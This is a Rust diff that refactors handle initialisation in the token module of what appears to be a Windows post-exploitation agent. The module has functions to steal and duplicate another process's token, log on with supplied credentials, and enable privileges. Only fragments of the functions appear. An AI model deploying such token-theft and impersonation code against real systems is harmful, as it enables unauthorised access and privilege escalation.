@@ -27,14 +27,14 @@ use super::{MakeCredentials, TokenEntry, TokenType};
 /// Opens the process token, duplicates it as an impersonation token,
 /// and returns a `TokenEntry` ready for vault insertion.
 pub fn steal_token(target_pid: u32, _target_handle: u32) -> Result<TokenEntry, u32> {
-    let mut process_handle: HANDLE = 0;
-    let mut token_handle: HANDLE = 0;
-    let mut dup_token: HANDLE = 0;
+    let mut process_handle: HANDLE = core::ptr::null_mut();
+    let mut token_handle: HANDLE = core::ptr::null_mut();
+    let mut dup_token: HANDLE = core::ptr::null_mut();
 
     unsafe {
         // Open the target process.
         process_handle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, target_pid);
-        if process_handle == 0 {
+        if process_handle.is_null() {
             return Err(GetLastError());
         }
 
@@ -89,7 +89,7 @@ pub fn make_token(
     let user_w: Vec<u16> = user.encode_utf16().chain(std::iter::once(0)).collect();
     let password_w: Vec<u16> = password.encode_utf16().chain(std::iter::once(0)).collect();
 
-    let mut token_handle: HANDLE = 0;
+    let mut token_handle: HANDLE = core::ptr::null_mut();
 
     unsafe {
         if LogonUserW(
@@ -160,6 +160,7 @@ pub fn is_token_elevated(handle: usize) -> bool {
 }
 
 /// Query the `DOMAIN\User` string from a token handle.
+#[allow(clippy::not_unsafe_ptr_arg_deref)]
 pub fn query_token_user(handle: HANDLE) -> Option<String> {
     let mut needed: u32 = 0;
 
@@ -212,7 +213,7 @@ pub fn query_token_user(handle: HANDLE) -> Option<String> {
 
 /// Get the current thread or process token handle.
 pub fn current_token_handle() -> Result<HANDLE, u32> {
-    let mut handle: HANDLE = 0;
+    let mut handle: HANDLE = core::ptr::null_mut();
     unsafe {
         // Try thread token first (if impersonating).
         if OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &mut handle) != FALSE {
@@ -287,7 +288,7 @@ pub fn list_privileges() -> Result<Vec<(String, u32)>, u32> {
 pub fn enable_privilege(priv_name: &str) -> Result<bool, u32> {
     let handle = current_token_handle()?;
     // Need TOKEN_ADJUST_PRIVILEGES.
-    let mut adj_handle: HANDLE = 0;
+    let mut adj_handle: HANDLE = core::ptr::null_mut();
     unsafe {
         if OpenThreadToken(
             GetCurrentThread(),
